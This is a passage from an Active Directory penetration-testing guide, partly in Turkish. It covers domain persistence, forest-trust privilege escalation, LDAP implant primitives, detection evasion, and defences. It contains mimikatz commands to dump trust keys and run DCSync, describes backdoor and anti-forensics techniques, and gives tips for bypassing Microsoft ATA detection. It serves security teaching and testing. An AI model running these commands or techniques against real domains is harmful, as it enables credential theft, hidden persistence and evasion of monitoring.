diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest yetki yükseltme
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trustlarını numaralandırmanın diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> You can the one used by the current domain them with:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Enterprise admin olarak child/parent domain'e, trust'u SID-History injection ile kötüye kullanarak yükselin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)'nin nasıl exploited edilebileceğini anlamak kritiktir. Configuration NC, Active Directory (AD) ortamlarında tüm forest genelindeki configuration data için merkezi bir repository olarak hizmet eder. Bu data forest içindeki her Domain Controller (DC)'a replicated edilir ve writable DC'ler Configuration NC'nin writable bir kopyasını tutar. Bunu exploited etmek için, bir DC üzerinde **SYSTEM privileges** gerekir, tercihen bir child DC.

**Link GPO to root DC site**

Configuration NC'nin Sites container'ı, AD forest içindeki domain-joined tüm computer'ların site bilgilerini içerir. Herhangi bir DC üzerinde SYSTEM privileges ile çalışarak attackers, GPO'ları root DC sites'e link edebilir. Bu işlem, bu sitelere uygulanan policies'i manipulate ederek root domain'i potansiyel olarak compromise eder.

Derinlemesine bilgi için [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) üzerine araştırmayı inceleyebilirsiniz.

**Compromise any gMSA in the forest**

Bir attack vector, domain içindeki privileged gMSA'ları target almaktır. gMSA'ların passwords'larını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde stored edilir. Herhangi bir DC üzerinde SYSTEM privileges ile KDS Root key'e access etmek ve forest genelindeki herhangi bir gMSA için passwords'ları compute etmek mümkündür.

Detaylı analysis ve step-by-step guidance şu kaynakta bulunabilir:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Bu method sabır gerektirir; yeni privileged AD objects'in oluşturulmasını beklemeyi gerektirir. SYSTEM privileges ile attacker, herhangi bir user'a tüm classes üzerinde tam control vermek için AD Schema'yı modify edebilir. Bu, newly created AD objects üzerinde unauthorized access ve control'e yol açabilir.

Daha fazla okuma için [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication yapılmasını sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) objects üzerindeki control'ü hedef alır. PKI objects Configuration NC içinde bulunduğundan, writable bir child DC'nin compromise edilmesi ESC5 attacks'in yürütülmesini mümkün kılar.

Bununla ilgili daha fazla detay [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) içinde okunabilir. ADCS olmayan senaryolarda, attacker gerekli bileşenleri kurma yeteneğine sahiptir; bu, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) içinde anlatılmıştır.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **alanınız**, dış bir alan tarafından **güveniliyor** ve bu size onun üzerinde **belirsiz izinler** veriyor. Bulmanız gereken şey, **alanınızdaki hangi principal’lerin dış alan üzerinde hangi erişime sahip olduğu** ve ardından bunu istismar etmeye çalışmaktır:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **domaininiz**, başka **domainlerden** gelen bir principal’a bazı **privileges** vererek ona **güveniyor**.

Ancak, **trusted domain** tarafından bir **domain trusted** olduğunda, trusted domain **öngörülebilir bir isim** ile bir kullanıcı **oluşturur** ve bunu **trusted password**'ü parola olarak kullanır. Bu da, trusting domain içindeki bir kullanıcıya erişip trusted olanın içine girmek, onu enumerate etmek ve daha fazla privilege yükseltmeyi denemek için mümkün olduğu anlamına gelir:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain’i ele geçirmenin başka bir yolu da, domain trust’ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain’i ele geçirmenin başka bir yolu da, **trusted domain’den bir user’ın erişebileceği** bir makinede **RDP** ile login olmayı beklemektir. Sonra attacker, RDP session process içine code enjekte edebilir ve oradan **victim’in origin domain’ine** erişebilir.\
Ayrıca, eğer **victim hard drive’ını mount ettiyse**, **RDP session** process’inden attacker hard drive’ın **startup folder**’ına **backdoor** saklayabilir. Bu technique’e **RDPInception** denir.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trust’lar across SID history attribute’u kullanarak yapılan saldırıların riski, varsayılan olarak tüm inter-forest trust’larda etkin olan SID Filtering ile azaltılır. Bu, Microsoft’un yaklaşımına göre security boundary olarak domain yerine forest’ı dikkate alan ve intra-forest trust’ların secure olduğu varsayımına dayanır.
- Ancak bir nokta var: SID filtering applications ve user access’i bozabilir, bu da bazen devre dışı bırakılmasına yol açar.

### **Selective Authentication:**

- Inter-forest trust’lar için Selective Authentication kullanmak, iki forest’tan gelen users’ın otomatik olarak authenticated edilmemesini sağlar. Bunun yerine, users’ın trusting domain veya forest içindeki domains ve servers’a erişmesi için explicit permissions gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC) exploit edilmesine veya trust account’a yönelik saldırılara karşı koruma sağlamadığını unutmamak önemlidir.

[**Domain trusts hakkında daha fazla bilgi ired.team’de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitives’ı tamamen on-host implant içinde çalışan x64 Beacon Object Files olarak yeniden uygular (ör. Adaptix C2). Operators paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs` yükler ve ardından beacon’dan `ldap <subcommand>` çağırır. Tüm traffic mevcut logon security context üzerinden LDAP (389) ile signing/sealing ya da LDAPS (636) ile auto certificate trust kullanarak taşınır, bu yüzden socks proxy’ler veya disk artifact’leri gerekmez.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, ve `get-groupmembers` kısa isimleri/OU path’lerini tam DN’lere çözer ve ilgili object’leri döker.
- `get-object`, `get-attribute`, ve `get-domaininfo` keyfi attribute’ları (security descriptor’lar dahil) ve `rootDSE` içindeki forest/domain metadata’sını çeker.
- `get-uac`, `get-spn`, `get-delegation`, ve `get-rbcd` roasting adaylarını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor’larını doğrudan LDAP’den gösterir.
- `get-acl` ve `get-writable --detailed`, DACL’i ayrıştırarak trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance bilgilerini listeler; böylece ACL privilege escalation için anında hedefler sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Yükseltme ve kalıcılık için LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatörün, OU rights mevcut olan her yerde yeni principal’lar veya machine account’lar hazırlamasına izin verir. `add-groupmember`, `set-password`, `add-attribute`, ve `set-attribute`, write-property rights bulunduğunda hedefleri doğrudan ele geçirir.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD object üzerindeki WriteDACL/WriteOwner yetkisini parola sıfırlama, group membership kontrolü veya DCSync replication privilege’larına çevirir; bunu yaparken PowerShell/ADSI artifact’ları bırakmaz. `remove-*` karşılıkları enjekte edilen ACE’leri temizler.

### Delegation, roasting, ve Kerberos abuse

- `add-spn`/`set-spn`, ele geçirilmiş bir user’ı anında Kerberoastable yapar; `add-asreproastable` (UAC toggle) ise password’a dokunmadan onu AS-REP roasting için işaretler.
- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, veya `msDS-AllowedToActOnBehalfOfOtherIdentity` alanlarını beacon üzerinden yeniden yazar; böylece constrained/unconstrained/RBCD attack path’leri etkinleşir ve remote PowerShell veya RSAT ihtiyacı ortadan kalkar.

### sidHistory injection, OU relocation, ve attack surface shaping

- `add-sidhistory`, kontrollü bir principal’ın SID history’sine ayrıcalıklı SID’ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın), tamamen LDAP/LDAPS üzerinden gizli access inheritance sağlar.
- `move-object`, computer veya user’ların DN/OU bilgisini değiştirir; bu da saldırgana, delegated rights zaten mevcut olan OU’ların içine asset’leri taşıma ve ardından `set-password`, `add-groupmember`, veya `add-spn` kullanma imkânı verir.
- Dar kapsamlı removal komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.), operatör credential’ları veya persistence topladıktan sonra hızlı rollback yapılmasına izin verir ve telemetry’yi minimize eder.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Credential Koruması için Savunma Önlemleri**

- **Domain Admins Restrictions**: Domain Admins’in yalnızca Domain Controllers üzerinde login olmasına izin verilmesi, diğer host’larda kullanılmalarından kaçınılması tavsiye edilir.
- **Service Account Privileges**: Güvenliği korumak için services, Domain Admin (DA) privileges ile çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA privileges gerektiren görevler için süre kısıtlanmalıdır. Bu şu şekilde yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID’ler 2889/3074/3075’i audit edin ve ardından LDAP MITM/relay girişimlerini engellemek için DC’lerde/clients’larda LDAP signing ile LDAPS channel binding uygulayın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

AD tradecraft’in yaygın kullanımını tespit etmek istiyorsanız, **yalnızca operator-controlled artifact’lara** güvenmeyin; örneğin yeniden adlandırılmış binaries, service names, temp batch files veya output paths. Meşru Windows client’ların [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, ve WMI trafiğini nasıl oluşturduğunu temel alın ve ardından, operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, veya `ntlmrelayx.py` dosyalarını düzenledikten sonra bile kalan **implementation quirks** işaretlerini arayın.

- **High-confidence standalone candidates** (kendi baseline’ınızla doğruladıktan sonra):
- `auth_context_id = 79231 + ctx_id` kullanarak authenticated DCE/RPC
- `0xff` ile doldurulmuş DCE/RPC authentication padding
- Raw Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine koyan LDAP Kerberos bind’leri
- ASCII benzeri `ClientGuid` değerlerine sahip SMB2/3 negotiate request’leri
- Standart dışı `//./root/cimv2` namespace’ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce değerleri
- **Correlation/scoring feature’ları için daha iyi**:
- Seyrek veya kopyalanmış Kerberos etype listeleri, alışılmadık/eksik `PA-DATA`, ya da native Windows’tan farklı TGS-REQ etype sıralaması
- Version info içermeyen NTLM Type 1 message’ları veya null host name’li Type 3 message’ları
- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailer’ları veya SPNEGO/Kerberos OID uyumsuzlukları
- Aynı host/user/session/time window’dan gelen bu özelliklerden birkaçının birlikte görülmesi, tek bir zayıf field’dan çok daha güçlüdür
- **Standalone alert yerine enrichment olarak kullanın**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, ve tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Bunlar operatör tarafından kolayca değiştirilebilir; cross-protocol cluster’ın neden şüpheli olduğunu açıklamak için en iyi şekilde kullanılır
- **Operational notes**:
- Bu sinyallerin bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, veya service-side visibility gerektirir
- Alert’e dönüştürmeden önce Samba/Linux clients, appliances, ve legacy software ile doğrulayın
- Confidence arttıkça detections’ı enrichment -> hunting -> alerting şeklinde ilerletin

### **Deception Tekniklerini Uygulama**

- Deception uygulamak, expire olmayan veya Trusted for Delegation olarak işaretlenmiş password’lar gibi özelliklere sahip, sahte kullanıcılar veya bilgisayarlar şeklinde tuzaklar kurmayı içerir. Ayrıntılı yaklaşım, belirli rights’lara sahip kullanıcılar oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi kapsar.
- Pratik bir örnek olarak şu tool’lar kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerinin dağıtımı hakkında daha fazlası için [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) sayfasına bakın.

### **Deception’ı Tespit Etme**

- **User Object’leri İçin**: Şüpheli göstergeler arasında atipik ObjectSID, seyrek logon’lar, creation date’ler, ve düşük bad password count’ları bulunur.
- **Genel Göstergeler**: Potansiyel decoy object’lerin attribute’larını gerçek object’lerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi tool’lar bu deception’ları belirlemede yardımcı olabilir.

### **Detection Sistemlerini Atlatma**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection’ını önlemek için Domain Controllers üzerinde session enumeration yapmaktan kaçının.
- **Ticket Impersonation**: Ticket oluştururken **aes** keys kullanmak, NTLM’e downgrade yapmadığı için detection’dan kaçınmaya yardımcı olur.
- **DCSync Attacks**: ATA detection’ını önlemek için bir Domain Controller olmayan bir sistemden çalıştırmak önerilir; doğrudan Domain Controller’dan çalıştırma alert tetikler.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
